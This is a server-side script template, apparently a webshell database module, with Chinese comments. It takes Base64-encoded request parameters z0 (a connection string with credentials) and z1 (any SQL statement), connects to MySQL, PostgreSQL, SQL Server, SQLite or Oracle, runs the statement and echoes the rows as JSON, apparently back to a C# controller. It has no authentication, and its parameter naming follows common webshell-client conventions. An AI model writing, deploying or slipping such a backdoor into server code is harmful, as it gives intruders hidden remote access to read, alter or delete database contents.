<%

// 1. 獲取並解碼前端參數 z0 (DSN) 與 z1 (SQL)
var paramMap = request.getParameterMap();
var dsnUrl = "";
var sqlCmd = "";

if (paramMap.containsKey("z0")) dsnUrl = new java.lang.String(java.util.Base64.getDecoder().decode(paramMap.get("z0")[0]), "UTF-8");
if (paramMap.containsKey("z1")) sqlCmd = new java.lang.String(java.util.Base64.getDecoder().decode(paramMap.get("z1")[0]), "UTF-8");

var resObj = { "success": false, "data": [] };

try {
    if (!dsnUrl) throw new Error("Missing DSN URL.");

    // 2. 解析自定義 DSN (對齊你的 PHP 解析邏輯)
    var connConfig = parseCustomDsn(dsnUrl);
    
    // 3. 根據資料庫類型，動態生成 Java 的標準 JDBC 網址與載入驅動
    var jdbcUrl = "";
    var user = connConfig.user;
    var pass = connConfig.pass;
    
    switch (connConfig.driver) {
        case "mysql":
            // 自動適應新舊版 MySQL 驅動
            try { java.lang.Class.forName("com.mysql.cj.jdbc.Driver"); } 
            catch(e) { java.lang.Class.forName("com.mysql.jdbc.Driver"); }
            jdbcUrl = "jdbc:mysql://" + connConfig.host + ":" + (connConfig.port ? connConfig.port : "3306") + "/" + connConfig.database + "?useSSL=false&serverTimezone=UTC&characterEncoding=utf-8";
            break;
            
        case "pgsql":
            java.lang.Class.forName("org.postgresql.Driver");
            jdbcUrl = "jdbc:postgresql://" + connConfig.host + ":" + (connConfig.port ? connConfig.port : "5432") + "/" + connConfig.database;
            break;
            
        case "sqlsrv":
            java.lang.Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
            jdbcUrl = "jdbc:sqlserver://" + connConfig.host + ":" + (connConfig.port ? connConfig.port : "1433") + ";databaseName=" + connConfig.database;
            break;
            
        case "sqlite":
            java.lang.Class.forName("org.sqlite.JDBC");
            jdbcUrl = "jdbc:sqlite:" + connConfig.database; // SQLite database 欄位內直接存硬碟物理路徑
            break;
            
        case "oracle":
            java.lang.Class.forName("oracle.jdbc.driver.OracleDriver");
            // 支援 thin 連線格式
            jdbcUrl = "jdbc:oracle:thin:@//" + connConfig.host + ":" + (connConfig.port ? connConfig.port : "1521") + "/" + connConfig.database;
            break;
            
        default:
            throw new Error("Unsupported database driver: " + connConfig.driver);
    }

    // 4. 建立連線
    var conn = null;
    if (user != "" || pass != "") {
        conn = java.sql.DriverManager.getConnection(jdbcUrl, user, pass);
    } else {
        conn = java.sql.DriverManager.getConnection(jdbcUrl);
    }

    // 5. 如果沒有傳入 SQL，代表只是在進行連線測試 (對齊你的 PHP 測試模式)
    if (!sqlCmd || sqlCmd.trim() == "") {
        resObj.success = true;
        resObj.message = "Database connection is OK";
        conn.close();
        Echo(JSON.stringify(resObj));
    } else {
        // 6. 建立 Statement 執行命令
        var stmt = conn.createStatement();
        var hasResultSet = stmt.execute(sqlCmd);

        if (hasResultSet) {
            // ──── 代表是 SELECT 查詢語句，需要撈取欄位與資料 ────
            var rs = stmt.getResultSet();
            var metaData = rs.getMetaData();
            var columnCount = metaData.getColumnCount();
            
            var rowsArray = [];
            while (rs.next()) {
                var rowMap = {};
                for (var i = 1; i <= columnCount; i++) {
                    var columnName = metaData.getColumnLabel(i);
                    var columnValue = rs.getObject(i);
                    // 轉成 String 避免 JavaScript 序列化 Java 特殊型態時崩潰
                    rowMap[columnName] = columnValue != null ? String(columnValue) : null;
                }
                rowsArray.push(rowMap);
            }
            
            resObj.success = true;
            resObj.rowCount = rowsArray.length;
            resObj.data = rowsArray;
            
            rs.close();
        } else {
            // ──── 代表是 UPDATE / INSERT / DELETE 更新語句 ────
            var updateCount = stmt.getUpdateCount();
            resObj.success = true;
            resObj.rowCount = updateCount;
            resObj.data = [];
        }
        
        stmt.close();
        conn.close();
        
        // 7. 將結果轉成 JSON 衝刷回 C#
        Echo(JSON.stringify(resObj));
    }

} catch (err) {
    resObj.success = false;
    resObj.error = err.message;
    Echo(JSON.stringify(resObj));
}

// 🛠️ 輔助自定義 DSN 解析函式 (相容標準與非標準 URL)
function parseCustomDsn(url) {
    var config = { driver: "", host: "", port: "", database: "", user: "", pass: "" };
    
    // 處理不帶雙斜線的特殊檔案路徑 (例如 sqlite://D:/test.db)
    if (url.indexOf("sqlite://") === 0) {
        config.driver = "sqlite";
        config.database = url.substring(9);
        return config;
    }
    
    // 利用 Java 原生的 URI 類別做高精準解析
    var uri = new java.net.URI(url);
    config.driver = String(uri.getScheme()).toLowerCase();
    config.host = uri.getHost() ? String(uri.getHost()) : "";
    config.port = uri.getPort() != -1 ? String(uri.getPort()) : "";
    
    var path = uri.getPath() ? String(uri.getPath()) : "";
    if (path.indexOf("/") === 0) path = path.substring(1); // 拔掉最前端的斜線
    config.database = path;
    
    var userInfo = uri.getUserInfo() ? String(uri.getUserInfo()) : "";
    if (userInfo != "") {
        var parts = userInfo.split(":");
        config.user = parts[0];
        config.pass = parts[1] ? parts[1] : "";
    }
    
    return config;
}

%>